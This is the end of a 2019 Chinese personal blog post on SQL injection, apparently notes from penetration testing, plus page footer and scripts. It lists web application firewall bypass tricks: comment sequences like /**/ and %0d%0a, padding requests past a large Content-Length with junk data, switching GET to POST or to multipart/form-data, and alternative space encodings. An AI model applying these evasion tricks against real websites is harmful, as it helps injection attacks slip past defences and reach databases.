<p>利用注释符号 /**/ #test%0d%0a –+a</p>
<p>超长数据包pass：</p>
<p>get型请求转post型</p>
<p>content—length 头长度大于4008 正常参数放置在脏数据后面，否则无效</p>
<p>空格替换bypass拒绝传统的%20</p>
<p>协议转换bypass使用表单请求中的multipart/form-data</p>
<hr>
<p>未完待续……</p>
<p>人们只愿看到自己想看到的一切，分不清是非对错，黑白颠倒。–Hades</p>

            </div>
          

    
      <footer class="post-footer">
		
		<div class="post-tags">
		  
			<a href="/tags/sql注入/">sql注入</a>
		  
		</div>
		

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2019/08/11/渗透测试中的信息收集/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">渗透测试中的信息收集</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/08/09/笔记/">
        <span class="next-text nav-default">笔记</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon"><span class="copyright-year">
    
        &copy;
    
        2014 -
    
    2019
    <span class="footer-author">Hades.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    


    
  





  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":"ture"},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>